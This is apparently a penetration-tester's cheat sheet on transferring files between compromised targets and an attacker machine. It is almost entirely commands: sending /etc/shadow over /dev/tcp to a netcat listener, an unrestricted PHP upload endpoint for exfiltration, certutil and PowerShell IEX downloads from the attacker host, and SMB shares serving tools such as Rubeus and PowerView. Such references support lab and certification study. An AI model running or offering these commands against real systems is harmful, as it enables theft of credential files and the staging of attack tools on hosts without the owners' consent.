# Trasferring Files

## Linux Target -> Linux Attacker

### Without any tools

```bash
cat /etc/shadow > /dev/tcp/IP/PORT

nc -lvnp 4444 > exfiltrated_shadow
```

## All OS Target -> Linux Attacker

### HTTP Apache Server

```bash
# copy file to transfer in apache repo
cp /opt/Windows/windows-resources/binaries/nc.exe /var/www/html

# start apache service
systemctl start apache2

# Check Active internet connections
netstat -tulpn
```

### Setup Apache Server to Upload Files

One method of transfer file to attacker's machine is to set up an upload method that allow us to upload files through the Apache Server.

1. Create a .php file into '_/var/www/html_' with this body:

{% code title="upload.php" %}
```php
<?php
$uploaddir = '/var/www/uploads/';
$uploadfile = $uploaddir . $_FILES['file']['name'];
move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)
?>
```
{% endcode %}

2. Create the uploads directory to house our uploads.

```bash
mkdir /var/www/uploads
chown www-data:www-data /var/www/uploads
```

3. Make a request with a file to Apache Server

```bash
wget --post-file=/PATH/TO/$FILENAME  http://$ATT_IP/upload.php
curl -F 'file=@/PATH/TO/$FILENAME' http://$ATT_IP/upload.php
```



## Windows Targets -> Linux Attacker

### Python Server

```bash
# Attacker linux machine
python -m SimpleHTTPServer 80
python3 -m http.server 80

# Target machine
cd C:\
mkdir Temp
cd Temp

# 1
certutil -urlcache -f http://IP:80/file.exe file_name.exe

# 2
IEX(New-Object Net.WebClient).DownloadString("http://$IP:$PORT/file_name.exe")

# 3
IWR -Uri http://$IP/$FILENAME -OutFile C:\temp\$FILENAME
```

### SMB Server Impacket

_"This script will launch a SMB Server and add a share specified as an argument. You need to be root in order to bind to port 445. For optional authentication, it is possible to specify username and password or the NTLM hash. Example: smbserver.py -comment 'My share' TMP /tmp"_

<pre class="language-bash"><code class="lang-bash"># Att Kali Machine
cd /usr/share/doc/python3-impacket/examples
./smbserver.py $SHARE_NAME $(pwd) -smb2support

# from impacket tool 
impacket-smbserver smbFolder $(pwd) -smb2support

# Target machine
cp \\$ATT_IP\$SHARE_NAME\$FILENAME . # (ex. \\172.16.1.30\share\rubeus.exe .)
copy \\10.10.14.90\smbFolder\file.exe # ex
<strong>
</strong><strong># import a .ps1 module
</strong>. \\$ATT_IP\$SHARE_NAME\$FILENAME # (ex. \\172.16.1.30\share\PowerView.ps1)
</code></pre>



## Linux Targets -> Linux Attacker

### Python Server

{% code overflow="wrap" %}
```bash
# Attacker's machine
python -m SimpleHTTPServer 80
python3 -m http.server 80

# Target machine
## WGET
wget http://IP:80/file.py -O /tmp/$FILENAME
## CURL
curl $IP/$FILENAME -o /tmp/$FILENAME
# BASH
bash -c '{ echo -ne "GET /linpeas.sh HTTP/1.0\r\nhost: 172.16.1.30\r\n\r\n" 1>&3; cat 0<&3; } \
   3<>/dev/tcp/172.16.1.30/80 \
   | { while read -r; do [ "$REPLY" = "$(echo -ne "\r")" ] && break; done; cat; } > linpeas.sh'
```
{% endcode %}

### FTP Server

```bash
# Attacker's machine
python3 -m pyftpdlib -w -p 21

# Target machine
## get a file from att machine
ftp $ATT_IP
ftp> ls -l
ftp> get $FILENAME

## upload a file to att machine
ftp $ATT_IP
ftp> ls -l
ftp> put $LOCAL_FILENAME
ftp> ls -l
```

## Windows Target -> Linux Attacker

### Netcat

```bash
# attacker machine (who receives)
nc -lnvp PORT > file.txt

# windows target machine
nc64.exe -nv ATT_IP ATT_PORT < file.txt -w 15
```









## Trasfering file with NC.exe

[#send-files-via-nc](shells/#send-files-via-nc "mention")



## Resources

{% embed url="https://juggernaut-sec.com/linux-file-transfers-for-hackers/" %}

